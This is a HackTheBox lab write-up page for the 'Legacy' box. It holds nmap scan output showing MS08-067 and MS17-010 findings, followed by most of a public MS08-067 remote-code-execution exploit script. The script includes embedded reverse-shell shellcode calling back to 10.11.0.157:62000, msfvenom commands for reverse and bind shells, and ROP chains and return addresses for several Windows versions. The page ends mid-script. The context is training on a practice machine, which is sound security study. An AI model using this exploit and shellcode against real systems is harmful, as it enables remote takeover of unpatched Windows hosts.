<!DOCTYPE html>
<html>
  <head>
    <title>DocDock Documentation</title>
    
      <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<meta name="revised" content="2019-03-19T14:50:45 EDT">
<title>Legacy :: DocDock Documentation</title>
<link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
<link href="/css/font-awesome.min.css" rel="stylesheet">
<link href="/css/nucleus.css" rel="stylesheet">
<link href="/theme-flex/style.css" rel="stylesheet">

	<link href="/theme-flex/variant-red.css" rel="stylesheet">

<link rel="stylesheet" href="/css/bootstrap.min.css">
<script src="/js/jquery-2.x.min.js"></script>
<script type="text/javascript">
      var baseurl = "\/";
</script>
<meta name="description" content="">



    
  </head>
  <body data-url="/hackthebox/boxes/legacy/">
    
      <header>
  <div class="logo">
    




<h2 id="chickenpwny">ChickenPwny</h2>




  </div>
  <div class="burger"><a href="javascript:void(0);" style="font-size:15px;">&#9776;</a></div>
    <nav class="shortcuts">
            <li class="" role="">
                <a href="https://twitter.com/chickenpwny"  rel="noopener">
                  <i class='fa fa-twitter'></i> <label>Twitter</label>
                </a>
            </li>
            <li class="" role="">
                <a href="https://github.com/vjeantet/hugo-theme-docdock"  rel="noopener">
                  <i class='fa fa-github'></i> <label>Github repo</label>
                </a>
            </li>
            <li class="" role="">
                <a href="https://chickenpwny.github.io/images/meme/raw.gif"  rel="noopener">
                  <i class='fa fa-cloud-download'></i> <label>Download</label>
                </a>
            </li>
            <li class="" role="">
                <a href="#"  rel="noopener">
                  <i class='fa fa-bookmark'></i> <label>Book Mark</label>
                </a>
            </li>
            <li class="" role="">
                <a href="/credits"  rel="noopener">
                  <i class='fa fa-bullhorn'></i> <label>Credits</label>
                </a>
            </li>
    </nav>
</header>
<article>
  <aside>
    <ul class="menu">
<a href="http://chickenpwny.github.io"><img src="/images/meme/home.jpg" alt="Alternate Text" style="width:45%;margin-left:auto;margin-right:auto;border-radius:50%;display:block;" alt="Home" /></a>
<li data-nav-id="/concepts/" class="dd-item haschildren
        ">
    <div>

        <a href="/concepts/">Concept</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
    </div>
    <ul>
<li data-nav-id="/concepts/webapppentest/" class="dd-item haschildren
        ">
    <div>

        <a href="/concepts/webapppentest/">WebAppPenTests</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
    </div>
    <ul>
<li data-nav-id="/concepts/webapppentest/lfi/" class="dd-item
        ">
    <div>

        <a href="/concepts/webapppentest/lfi/"> Local File inclusion</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/concepts/webapppentest/heartbld/" class="dd-item
        ">
    <div>

        <a href="/concepts/webapppentest/heartbld/">HeartBleed</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/concepts/webapppentest/osinjcmd/" class="dd-item
        ">
    <div>

        <a href="/concepts/webapppentest/osinjcmd/">OS Command Injection</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/concepts/webapppentest/phptypejuggling/" class="dd-item
        ">
    <div>

        <a href="/concepts/webapppentest/phptypejuggling/">PHP Typw Juggling</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
    </ul>
</li>
    </ul>
</li>
<li data-nav-id="/hackthebox/" class="dd-item parent haschildren
        ">
    <div>

        <a href="/hackthebox/">HackTheBox</a>
        <i class="fa fa-angle-down fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
    </div>
    <ul>
<li data-nav-id="/hackthebox/boxes/" class="dd-item parent haschildren
        ">
    <div>

        <a href="/hackthebox/boxes/">Boxes</a>
        <i class="fa fa-angle-down fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
    </div>
    <ul>
<li data-nav-id="/hackthebox/boxes/hawk/" class="dd-item
        ">
    <div>

        <a href="/hackthebox/boxes/hawk/"></a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/blue/" class="dd-item
        ">
    <div>

        <a href="/hackthebox/boxes/blue/">Blue</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/carrier/" class="dd-item">
    <div>
        <a href="/hackthebox/boxes/carrier/">
            Carrier
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/carrier-root/" class="dd-item">
    <div>
        <a href="/hackthebox/boxes/carrier-root/">
            CarrierRoot
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/crimestoppers/" class="dd-item
        ">
    <div>

        <a href="/hackthebox/boxes/crimestoppers/">CrimeStopper</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/devel/" class="dd-item">
    <div>
        <a href="/hackthebox/boxes/devel/">
            Devel
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/legacy/" class="dd-item parent active
        ">
    <div>

        <a href="/hackthebox/boxes/legacy/">Legacy</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/mischief/" class="dd-item
        ">
    <div>

        <a href="/hackthebox/boxes/mischief/">Mischief</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/optimum/" class="dd-item">
    <div>
        <a href="/hackthebox/boxes/optimum/">
            Optimum
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/poison/" class="dd-item
        ">
    <div>

        <a href="/hackthebox/boxes/poison/">Poison</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/secnotes/" class="dd-item
        ">
    <div>

        <a href="/hackthebox/boxes/secnotes/">SecNotes</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/valentine/" class="dd-item
        ">
    <div>

        <a href="/hackthebox/boxes/valentine/">Valentine</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/waldo/" class="dd-item
        ">
    <div>

        <a href="/hackthebox/boxes/waldo/">Waldo</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/zipper/" class="dd-item
        ">
    <div>

        <a href="/hackthebox/boxes/zipper/">Zipper</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/oz/" class="dd-item
        ">
    <div>

        <a href="/hackthebox/boxes/oz/">oz</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/sunday/" class="dd-item
        ">
    <div>

        <a href="/hackthebox/boxes/sunday/">sunday</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
    </ul>
</li>
<li data-nav-id="/hackthebox/github/" class="dd-item haschildren
        ">
    <div>

        <a href="/hackthebox/github/">GitHub</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
    </div>
    <ul>
<li data-nav-id="/hackthebox/github/hugopowershell/" class="dd-item">
    <div>
        <a href="/hackthebox/github/hugopowershell/">
            Hugo/Github/Power
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
    </ul>
</li>
<li data-nav-id="/hackthebox/challenges/" class="dd-item haschildren
        ">
    <div>

        <a href="/hackthebox/challenges/">Miscellaneous</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
    </div>
    <ul>
<li data-nav-id="/hackthebox/challenges/bloodhound/" class="dd-item">
    <div>
        <a href="/hackthebox/challenges/bloodhound/">
            
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
    </ul>
</li>
    </ul>
</li>
<li data-nav-id="/help/" class="dd-item
        ">
    <div>

        <a href="/help/">Network Manager Down</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/tools/" class="dd-item haschildren
        ">
    <div>

        <a href="/tools/">Tools</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
    </div>
    <ul>
<li data-nav-id="/tools/bloodhound/" class="dd-item">
    <div>
        <a href="/tools/bloodhound/">
            BloodHound Neo4j
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/tools/ftp/" class="dd-item">
    <div>
        <a href="/tools/ftp/">
            FTP
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/tools/hydra/" class="dd-item
        ">
    <div>

        <a href="/tools/hydra/">Hydra</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/tools/nmap/" class="dd-item">
    <div>
        <a href="/tools/nmap/">
            Nmap
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/tools/portscanning/" class="dd-item haschildren
        ">
    <div>

        <a href="/tools/portscanning/">PortScannings</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
    </div>
    <ul>
<li data-nav-id="/tools/portscanning/netcat/" class="dd-item
        ">
    <div>

        <a href="/tools/portscanning/netcat/">NetCat PORT SCAN</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/tools/portscanning/nmap/" class="dd-item
        ">
    <div>

        <a href="/tools/portscanning/nmap/">Nmap</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
    </ul>
</li>
<li data-nav-id="/tools/smb/smb/" class="dd-item">
    <div>
        <a href="/tools/smb/smb/">
            SMB
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/tools/snmpwalk/" class="dd-item
        ">
    <div>

        <a href="/tools/snmpwalk/">SNMPWalk</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/tools/webapp/" class="dd-item haschildren
        ">
    <div>

        <a href="/tools/webapp/">WebApps</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
    </div>
    <ul>
<li data-nav-id="/tools/webapp/burp/" class="dd-item
        ">
    <div>

        <a href="/tools/webapp/burp/">Burp</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/tools/webapp/gobuster/" class="dd-item
        ">
    <div>

        <a href="/tools/webapp/gobuster/">GoBuster</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/tools/webapp/skipfish/" class="dd-item
        ">
    <div>

        <a href="/tools/webapp/skipfish/">SkipFish</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/tools/webapp/sqlmap/sqlmap/" class="dd-item">
    <div>
        <a href="/tools/webapp/sqlmap/sqlmap/">
            SqlMap
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/tools/webapp/wfuzz/" class="dd-item
        ">
    <div>

        <a href="/tools/webapp/wfuzz/">WFuzz</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
    </ul>
</li>
<li data-nav-id="/tools/ssh/" class="dd-item haschildren
        ">
    <div>

        <a href="/tools/ssh/">ssh</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
    </div>
    <ul>
<li data-nav-id="/tools/ssh/port-forwarding/" class="dd-item
        ">
    <div>

        <a href="/tools/ssh/port-forwarding/">SHH Port Forwarding</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/tools/ssh/sshtunnling/" class="dd-item
        ">
    <div>

        <a href="/tools/ssh/sshtunnling/">SSHuttle</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
    </ul>
</li>
    </ul>
</li>



    </ul>
    <section>
    </section>
  </aside>
  <section class="page">
    
    <div class="nav-select">
      <center>Navigation : 
        <select onchange="javascript:location.href = this.value;">
          
    <option value="/concepts/" >
   Concept</option>
    <option value="/hackthebox/" >
   HackTheBox</option> 
    <option value="/hackthebox/boxes/" >
  - 
   Boxes</option> 
    <option value="/hackthebox/boxes/hawk/" >
  -- 
   </option>
    <option value="/hackthebox/boxes/blue/" >
  -- 
   Blue</option>
      <option value="/hackthebox/boxes/carrier/" >-- Carrier</option>
      <option value="/hackthebox/boxes/carrier-root/" >-- CarrierRoot</option>
    <option value="/hackthebox/boxes/crimestoppers/" >
  -- 
   CrimeStopper</option>
      <option value="/hackthebox/boxes/devel/" >-- Devel</option>
    <option value="/hackthebox/boxes/legacy/"  selected>
  -- 
   Legacy</option> 
  
    <option value="/hackthebox/boxes/mischief/" >
  -- 
   Mischief</option>
      <option value="/hackthebox/boxes/optimum/" >-- Optimum</option>
    <option value="/hackthebox/boxes/poison/" >
  -- 
   Poison</option>
    <option value="/hackthebox/boxes/secnotes/" >
  -- 
   SecNotes</option>
    <option value="/hackthebox/boxes/valentine/" >
  -- 
   Valentine</option>
    <option value="/hackthebox/boxes/waldo/" >
  -- 
   Waldo</option>
    <option value="/hackthebox/boxes/zipper/" >
  -- 
   Zipper</option>
    <option value="/hackthebox/boxes/oz/" >
  -- 
   oz</option>
    <option value="/hackthebox/boxes/sunday/" >
  -- 
   sunday</option>
  
    <option value="/hackthebox/github/" >
  - 
   GitHub</option>
    <option value="/hackthebox/challenges/" >
  - 
   Miscellaneous</option>
  
    <option value="/help/" >
   Network Manager Down</option>
    <option value="/tools/" >
   Tools</option>



        </select>
      </center>
    </div>
      <div>
        <div class="searchbox">
          <input data-search-input id="search-by" type="text" placeholder="Search...">
        </div>
        <script type="text/javascript" src="/js/lunr.min.js"></script>
        <script type="text/javascript" src="/js/auto-complete.js"></script>
        <link href="/css/auto-complete.css" rel="stylesheet">
        <script type="text/javascript">
          
              var baseurl = "\/";
          
        </script>
        <script type="text/javascript" src="/js/search.js"></script>
      </div>
    

    <h1>Legacy</h1>
    
    
    



<p>NMAP</p>

<pre><code>nmap -sC -sV -p 139,445 -oA nmap/scripts 10.10.10.4                                                                        
Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-22 19:37 EST
Nmap scan report for 10.10.10.4
Host is up (0.042s latency).

PORT    STATE SERVICE      VERSION
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp                                                           

Host script results:
|_clock-skew: mean: -4h05m13s, deviation: 1h24m51s, median: -5h05m13s
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:50:56:a4:5d:23 (VMware)                                                             
| smb-os-discovery:
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2019-02-22T23:32:00+02:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                               
Nmap done: 1 IP address (1 host up) scanned in 257.59 seconds
</code></pre>

<p>NMAP SCRIPT SMB-VULN</p>

<pre><code>nmap --script smb-vuln* -p 445 -oA nmap/smb_vulns 10.10.10.4
Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-22 19:50 EST
Nmap scan report for 10.10.10.4
Host is up (0.041s latency).                                                                                                                                 
                            
PORT    STATE SERVICE
445/tcp open  microsoft-ds       
                 
Host script results:                                                
| smb-vuln-cve2009-3103:                                                                                                                                     
|   VULNERABLE:                                                           
|   SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)
|     State: VULNERABLE                                     
|     IDs:  CVE:CVE-2009-3103    
|           Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2,
|           Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a
|           denial of service (system crash) via an &amp; (ampersand) character in a Process ID High header field in a NEGOTIATE
|           PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location,
|           aka &quot;SMBv2 Negotiation Vulnerability.&quot;
|
|     Disclosure date: 2009-09-08
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
|_      http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
| smb-vuln-ms08-067:
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|
|     Disclosure date: 2008-10-23
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
</code></pre>

<p>SMBMAP</p>

<pre><code>/home/htb/boxes/legacy# smbmap -H 10.10.10.4
[+] Finding open SMB ports....
[+] User SMB session establishd on 10.10.10.4...
[+] IP: 10.10.10.4:445  Name: 10.10.10.4                                        
        Disk                                                    Permissions
        ----                                                    -----------
[!] Access Denied
</code></pre>

<h2 id="ms08-067">ms08-067</h2>

<pre><code>#!/usr/bin/env python
import struct
import time
import sys
from threading import Thread  # Thread is imported incase you would like to modify

try:
    from impacket import smb
    from impacket import uuid
    #from impacket.dcerpc import dcerpc
    from impacket.dcerpc.v5 import transport

except ImportError, _:
    print 'Install the following library to make this script work'
    print 'Impacket : https://github.com/CoreSecurity/impacket.git'
    print 'PyCrypto : https://pypi.python.org/pypi/pycrypto'
    sys.exit(1)

print '#######################################################################'
print '#   MS08-067 Exploit'
print '#   This is a modified verion of Debasis Mohanty\'s code (https://www.exploit-db.com/exploits/7132/).'
print '#   The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi'
print '#'
print '#   Mod in 2018 by Andy Acer'
print '#   - Added support for selecting a target port at the command line.'
print '#   - Changed library calls to allow for establishing a NetBIOS session for SMB transport'
print '#   - Changed shellcode handling to allow for variable length shellcode.'
print '#######################################################################\n'

print ('''
$   This version requires the Python Impacket library version to 0_9_17 or newer.
$
$   Here's how to upgrade if necessary:
$
$   git clone --branch impacket_0_9_17 --single-branch https://github.com/CoreSecurity/impacket/
$   cd impacket
$   pip install .

''')

print '#######################################################################\n'


# ------------------------------------------------------------------------
# REPLACE THIS SHELLCODE with shellcode generated for your use
# Note that length checking logic follows this section, so there's no need to count bytes or bother with NOPS.
#
# Example msfvenom commands to generate shellcode:
# msfvenom -p windows/shell_bind_tcp RHOST=10.11.1.229 LPORT=443 EXITFUNC=thread -b &quot;\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40&quot; -f c -a x86 --platform windows
# msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.157 LPORT=443 EXITFUNC=thread -b &quot;\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40&quot; -f c -a x86 --platform windows
# msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.157 LPORT=62000 EXITFUNC=thread -b &quot;\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40&quot; -f c -a x86 --platform windows

# Reverse TCP to 10.11.0.157 port 62000:
shellcode=(
&quot;\x31\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e&quot;
&quot;\x42\xf6\xc3\xef\x83\xee\xfc\xe2\xf4\xbe\x1e\x41\xef\x42\xf6&quot;
&quot;\xa3\x66\xa7\xc7\x03\x8b\xc9\xa6\xf3\x64\x10\xfa\x48\xbd\x56&quot;
&quot;\x7d\xb1\xc7\x4d\x41\x89\xc9\x73\x09\x6f\xd3\x23\x8a\xc1\xc3&quot;
&quot;\x62\x37\x0c\xe2\x43\x31\x21\x1d\x10\xa1\x48\xbd\x52\x7d\x89&quot;
&quot;\xd3\xc9\xba\xd2\x97\xa1\xbe\xc2\x3e\x13\x7d\x9a\xcf\x43\x25&quot;
&quot;\x48\xa6\x5a\x15\xf9\xa6\xc9\xc2\x48\xee\x94\xc7\x3c\x43\x83&quot;
&quot;\x39\xce\xee\x85\xce\x23\x9a\xb4\xf5\xbe\x17\x79\x8b\xe7\x9a&quot;
&quot;\xa6\xae\x48\xb7\x66\xf7\x10\x89\xc9\xfa\x88\x64\x1a\xea\xc2&quot;
&quot;\x3c\xc9\xf2\x48\xee\x92\x7f\x87\xcb\x66\xad\x98\x8e\x1b\xac&quot;
&quot;\x92\x10\xa2\xa9\x9c\xb5\xc9\xe4\x28\x62\x1f\x9e\xf0\xdd\x42&quot;
&quot;\xf6\xab\x98\x31\xc4\x9c\xbb\x2a\xba\xb4\xc9\x45\x09\x16\x57&quot;
&quot;\xd2\xf7\xc3\xef\x6b\x32\x97\xbf\x2a\xdf\x43\x84\x42\x09\x16&quot;
&quot;\xbf\x12\xa6\x93\xaf\x12\xb6\x93\x87\xa8\xf9\x1c\x0f\xbd\x23&quot;
&quot;\x54\x85\x47\x9e\xc9\xe4\x42\x6b\xab\xed\x42\x04\xf3\x66\xa4&quot;
&quot;\x9c\xd3\xb9\x15\x9e\x5a\x4a\x36\x97\x3c\x3a\xc7\x36\xb7\xe3&quot;
&quot;\xbd\xb8\xcb\x9a\xae\x9e\x33\x5a\xe0\xa0\x3c\x3a\x2a\x95\xae&quot;
&quot;\x8b\x42\x7f\x20\xb8\x15\xa1\xf2\x19\x28\xe4\x9a\xb9\xa0\x0b&quot;
&quot;\xa5\x28\x06\xd2\xff\xee\x43\x7b\x87\xcb\x52\x30\xc3\xab\x16&quot;
&quot;\xa6\x95\xb9\x14\xb0\x95\xa1\x14\xa0\x90\xb9\x2a\x8f\x0f\xd0&quot;
&quot;\xc4\x09\x16\x66\xa2\xb8\x95\xa9\xbd\xc6\xab\xe7\xc5\xeb\xa3&quot;
&quot;\x10\x97\x4d\x23\xf2\x68\xfc\xab\x49\xd7\x4b\x5e\x10\x97\xca&quot;
&quot;\xc5\x93\x48\x76\x38\x0f\x37\xf3\x78\xa8\x51\x84\xac\x85\x42&quot;
&quot;\xa5\x3c\x3a&quot;
)
# ------------------------------------------------------------------------

# Gotta make No-Ops (NOPS) + shellcode = 410 bytes
num_nops = 410 - len(shellcode)
newshellcode = &quot;\x90&quot; * num_nops
newshellcode += shellcode  # Add NOPS to the front
shellcode = newshellcode   # Switcheroo with the newshellcode temp variable

#print &quot;Shellcode length: %s\n\n&quot; % len(shellcode)

nonxjmper = &quot;\x08\x04\x02\x00%s&quot; + &quot;A&quot; * 4 + &quot;%s&quot; + \
    &quot;A&quot; * 42 + &quot;\x90&quot; * 8 + &quot;\xeb\x62&quot; + &quot;A&quot; * 10
disableNXjumper = &quot;\x08\x04\x02\x00%s%s%s&quot; + &quot;A&quot; * \
    28 + &quot;%s&quot; + &quot;\xeb\x02&quot; + &quot;\x90&quot; * 2 + &quot;\xeb\x62&quot;
ropjumper = &quot;\x00\x08\x01\x00&quot; + &quot;%s&quot; + &quot;\x10\x01\x04\x01&quot;;
module_base = 0x6f880000


def generate_rop(rvas):
    gadget1 = &quot;\x90\x5a\x59\xc3&quot;
    gadget2 = [&quot;\x90\x89\xc7\x83&quot;, &quot;\xc7\x0c\x6a\x7f&quot;, &quot;\x59\xf2\xa5\x90&quot;]
    gadget3 = &quot;\xcc\x90\xeb\x5a&quot;
    ret = struct.pack('&lt;L', 0x00018000)
    ret += struct.pack('&lt;L', rvas['call_HeapCreate'] + module_base)
    ret += struct.pack('&lt;L', 0x01040110)
    ret += struct.pack('&lt;L', 0x01010101)
    ret += struct.pack('&lt;L', 0x01010101)
    ret += struct.pack('&lt;L',
                       rvas['add eax, ebp / mov ecx, 0x59ffffa8 / ret'] + module_base)
    ret += struct.pack('&lt;L', rvas['pop ecx / ret'] + module_base)
    ret += gadget1
    ret += struct.pack('&lt;L', rvas['mov [eax], ecx / ret'] + module_base)
    ret += struct.pack('&lt;L', rvas['jmp eax'] + module_base)
    ret += gadget2[0]
    ret += gadget2[1]
    ret += struct.pack('&lt;L', rvas[
                       'mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret'] + module_base)
    ret += struct.pack('&lt;L', rvas['pop ecx / ret'] + module_base)
    ret += gadget2[2]
    ret += struct.pack('&lt;L', rvas['mov [eax+0x10], ecx / ret'] + module_base)
    ret += struct.pack('&lt;L', rvas['add eax, 8 / ret'] + module_base)
    ret += struct.pack('&lt;L', rvas['jmp eax'] + module_base)
    ret += gadget3
    return ret


class SRVSVC_Exploit(Thread):
    def __init__(self, target, os, port=445):
        super(SRVSVC_Exploit, self).__init__()

        # MODIFIED HERE
        # Changed __port to port ... not sure if that does anything. I'm a newb.
        self.port = port
        self.target = target
        self.os = os

    def __DCEPacket(self):
        if (self.os == '1'):
            print 'Windows XP SP0/SP1 Universal\n'
            ret = &quot;\x61\x13\x00\x01&quot;
            jumper = nonxjmper % (ret, ret)
        elif (self.os == '2'):
            print 'Windows 2000 Universal\n'
            ret = &quot;\xb0\x1c\x1f\x00&quot;
            jumper = nonxjmper % (ret, ret)
        elif (self.os == '3'):
            print 'Windows 2003 SP0 Universal\n'
            ret = &quot;\x9e\x12\x00\x01&quot;  # 0x01 00 12 9e
            jumper = nonxjmper % (ret, ret)
        elif (self.os == '4'):
            print 'Windows 2003 SP1 English\n'
            ret_dec = &quot;\x8c\x56\x90\x7c&quot;  # 0x7c 90 56 8c dec ESI, ret @SHELL32.DLL
            ret_pop = &quot;\xf4\x7c\xa2\x7c&quot;  # 0x 7c a2 7c f4 push ESI, pop EBP, ret @SHELL32.DLL
            jmp_esp = &quot;\xd3\xfe\x86\x7c&quot;  # 0x 7c 86 fe d3 jmp ESP @NTDLL.DLL
            disable_nx = &quot;\x13\xe4\x83\x7c&quot;  # 0x 7c 83 e4 13 NX disable @NTDLL.DLL
            jumper = disableNXjumper % (
                ret_dec * 6, ret_pop, disable_nx, jmp_esp * 2)
        elif (self.os == '5'):
            print 'Windows XP SP3 French (NX)\n'
            ret = &quot;\x07\xf8\x5b\x59&quot;  # 0x59 5b f8 07
            disable_nx = &quot;\xc2\x17\x5c\x59&quot;  # 0x59 5c 17 c2
            # the nonxjmper also work in this case.
            jumper = nonxjmper % (disable_nx, ret)
        elif (self.os == '6'):
            print 'Windows XP SP3 English (NX)\n'
            ret = &quot;\x07\xf8\x88\x6f&quot;  # 0x6f 88 f8 07
            disable_nx = &quot;\xc2\x17\x89\x6f&quot;  # 0x6f 89 17 c2
            # the nonxjmper also work in this case.
            jumper = nonxjmper % (disable_nx, ret)
        elif (self.os == '7'):
            print 'Windows XP SP3 English (AlwaysOn NX)\n'
            rvasets = {'call_HeapCreate': 0x21286, 'add eax, ebp / mov ecx, 0x59ffffa8 / ret': 0x2e796, 'pop ecx / ret': 0x2e796 + 6,
                'mov [eax], ecx / ret': 0xd296, 'jmp eax': 0x19c6f, 'mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret': 0x10a56, 'mov [eax+0x10], ecx / ret': 0x10a56 + 6, 'add eax, 8 / ret': 0x29c64}
            # the nonxjmper also work in this case.
            jumper = generate_rop(rvasets) + &quot;AB&quot;
        else:
            print 'Not supported OS version\n'
            sys.exit(-1)

        print '[-]Initiating connection'

        # MORE MODIFICATIONS HERE #############################################################################################

        if (self.port == '445'):
            self.__trans = transport.DCERPCTransportFactory('ncacn_np:%s[\\pipe\\browser]' % self.target)
        else:
            # DCERPCTransportFactory doesn't call SMBTransport with necessary parameters. Calling directly here.
            # *SMBSERVER is used to force the library to query the server for its NetBIOS name and use that to 
            #   establish a NetBIOS Session.  The NetBIOS session shows as NBSS in Wireshark.

            self.__trans = transport.SMBTransport(remoteName='*SMBSERVER', remote_host='%s' % self.target, dstport = int(self.port), filename = '\\browser' )
        
        self.__trans.connect()
        print '[-]connected to ncacn_np:%s[\\pipe\\browser]' % self.target
        self.__dce = self.__trans.DCERPC_class(self.__trans)
        self.__dce.bind(uuid.uuidtup_to_bin(
            ('4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0')))
        path = &quot;\x5c\x00&quot; + &quot;ABCDEFGHIJ&quot; * 10 + shellcode + &quot;\x5c\x00\x2e\x00\x2e\x00\x5c\x00\x2e\x00\x2e\x00\x5c\x00&quot; + \
            &quot;\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00&quot; + jumper + &quot;\x00&quot; * 2
